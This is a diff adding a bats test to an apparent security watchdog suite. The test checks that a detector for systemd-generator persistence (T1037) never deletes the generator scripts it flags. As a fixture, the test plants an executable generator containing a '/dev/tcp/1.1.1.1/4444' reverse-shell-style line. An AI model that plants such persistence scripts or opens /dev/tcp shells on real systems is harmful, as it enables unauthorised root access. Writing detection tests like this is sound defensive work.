@@ -339,3 +339,25 @@ seed_benign() {
     bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
     [ -z "${bad}" ]
 }
+
+@test "INVARIANT (no auto-delete: systemd-generator-watchdog NEVER deletes generator scripts — surveillance not remediation)" {
+    # Sister to brain-wide no-auto-delete / surveillance-not-
+    # remediation INVARIANTs across L2 watchdog suites. The
+    # systemd-generator-watchdog DETECTS T1037 systemd-
+    # generator-trigger root-exec persistence but MUST NEVER
+    # emit rm/unlink commands to auto-clean the planted
+    # generator. The detected generator may be operator-
+    # legitimate (custom mount-unit generator, systemd-sysv-
+    # generator, hardware-detection generator) — silent auto-
+    # delete would destroy operator baseline state AND could
+    # break early-boot dependency resolution. Surveillance,
+    # never remediation. Locks anti-data-loss contract on the
+    # systemd-generator surveillance substrate.
+    seed_benign
+    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${GEND}/my-generator"
+    chmod 0755 "${GEND}/my-generator"
+    run_wd
+    [ -f "${GEND}/my-generator" ]
+    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
+    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(GEND|GENERATOR|FILE|file)' "${WD}"
+}
